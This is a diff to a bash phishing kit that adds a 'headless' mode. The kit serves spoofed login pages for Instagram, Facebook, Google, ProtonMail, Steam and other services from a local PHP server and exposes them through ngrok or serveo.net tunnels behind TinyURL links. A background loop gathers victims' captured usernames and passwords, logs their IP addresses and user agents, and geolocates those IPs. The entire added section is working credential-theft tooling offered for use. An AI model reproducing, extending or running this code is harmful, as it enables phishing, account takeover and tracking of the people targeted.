@@ -15,7 +15,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 }
 
-menu() {
+menu(){
 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m          \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
@@ -445,7 +445,302 @@ sleep 0.5
 done 
 
 }
+
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#Everything below this line is an addition for headless operations. 
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+function debug_log() {
+	local line
+
+	line="$1"
+
+	echo "($(date +%s\ %c) ${line})" >> error.log
+	return 0
+}
+
+
+hl_dependencies() {
+echo "In hl_dependencies"
+command -v php > /dev/null 2>&1 || { debug_log "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { debug_log "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+
+}
+
+hl_start() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { debug_log "I require unzip but it's not installed. Install it. Aborting."; exit 1;}
+command -v wget > /dev/null 2>&1 || { debug_log "I require wget but it's not installed. Install it. Aborting."; exit 1;}
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+debug_log "Download error... Termux, run: pkg install wget"
+exit 1
+fi
+
+
+
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+debug_log "Download error... "
+exit 1
+fi
+fi
+fi
+
+debug_log "Starting php server...\n"
+cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+debug_log "Starting ngrok server...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+#export link
+#export send_ip
+print $link
+print $send_ip
+hl_checkfound
+}
+
+hl_serverx() {
+debug_log "Starting php server...\n"
+cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+sleep 2
+debug_log "Starting server...\n"
+command -v ssh > /dev/null 2>&1 || { debug_log "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+sleep 10
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+#export send_link
+#export send_ip
+print $send_link
+print $send_ip
+hl_checkfound
+
+
+}
+
+hl_startx() {
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
+
+fi
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
+
+fi
+
+default_port="3333"
+port="${3:-${default_port}}"
+hl_serverx
+
+}
+
+
+hl_menu(){
+echo "Now in hl_menu with first var as $1"
+
+option=$1
+
+if [[ $option == 1 || $option == 01 ]]; then
+server="instagram"
+hl_start1 $2
+
+elif [[ $option == 2 || $option == 02 ]]; then
+server="facebook"
+hl_start1 $2
+elif [[ $option == 3 || $option == 03 ]]; then
+server="snapchat"
+hl_start1 $2
+elif [[ $option == 4 || $option == 04 ]]; then
+server="twitter"
+hl_start1 $2
+elif [[ $option == 5 || $option == 05 ]]; then
+server="github"
+hl_start1 $2
+elif [[ $option == 6 || $option == 06 ]]; then
+server="google"
+hl_start1 $2
+
+elif [[ $option == 7 || $option == 07 ]]; then
+server="spotify"
+hl_start1 $2
+
+elif [[ $option == 8 || $option == 08 ]]; then
+server="netflix"
+hl_start1 $2
+
+elif [[ $option == 9 || $option == 09 ]]; then
+server="origin"
+hl_start1 $2
+
+elif [[ $option == 10 ]]; then
+server="steam"
+hl_start1 $2
+
+elif [[ $option == 11 ]]; then
+server="yahoo"
+hl_start1 $2
+
+elif [[ $option == 12 ]]; then
+server="linkedin"
+hl_start1 $2
+
+elif [[ $option == 13 ]]; then
+server="protonmail"
+hl_start1 $2
+
+elif [[ $option == 14 ]]; then
+server="wordpress"
+hl_start1 $2
+
+elif [[ $option == 15 ]]; then
+server="microsoft"
+hl_start1 $2
+
+elif [[ $option == 16 ]]; then
+server="instafollowers"
+hl_start1 $2
+
+elif [[ $option == 17 ]]; then
+server="gitlab"
+hl_start1 $2
+
+elif [[ $option == 18 ]]; then
+server="pinterest"
+hl_start1 $2
+
+elif [[ $option == 19 ]]; then
+server="create"
+createpage
+hl_start1 $2
+
+elif [[ $option == 99 ]]; then
+exit 1
+
+else
+debug_log "Incorrect Spoof Target or No Target Chosen."
+exit 1
+fi
+}
+
+hl_start1() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+
+default_option_server=$1
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server == 1 || $option_server == 01 ]]; then
+hl_startx $3
+
+elif [[ $option_server == 2 || $option_server == 02 ]]; then
+hl_start
+else
+debug_log  "Incorrect Server Option or No Server Chosen."
+fi
+
+}
+
+hl_catch_cred() {
+
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+
+}
+
+
+hl_catch_ip() {
+touch sites/$server/saved.usernames.txt
+ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+
+if [[ -e iptracker.log ]]; then
+rm -rf iptracker.log
+fi
+
+IFS='\n'
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+}
+
+
+
+hl_checkfound() {
+
+echo "Running in background. Run command jobs to see subprocesses. \n Run 'kill %n' where n is a job number to stop the script."
+
+while [ true ]; do
+
+if [[ -e "sites/$server/ip.txt" ]]; then
+hl_catch_ip
+rm -rf sites/$server/ip.txt
+fi
+sleep 0.5
+if [[ -e "sites/$server/usernames.txt" ]]; then
+hl_catch_cred
+rm -rf sites/$server/usernames.txt
+fi
+sleep 0.5
+
+done 
+
+}
+
+
+response(){
 banner
 dependencies
 menu
+}
 
+headless(){
+echo "this is the Headless function"
+hl_dependencies
+hl_menu $@
+
+}
+main(){
+echo "Arguments received: $@"
+echo "First argument is $1"
+if [[ $1 == "" ]]; then
+	echo "Running interactive."
+	response
+else
+	headless $@
+fi
+}
+
+main $@
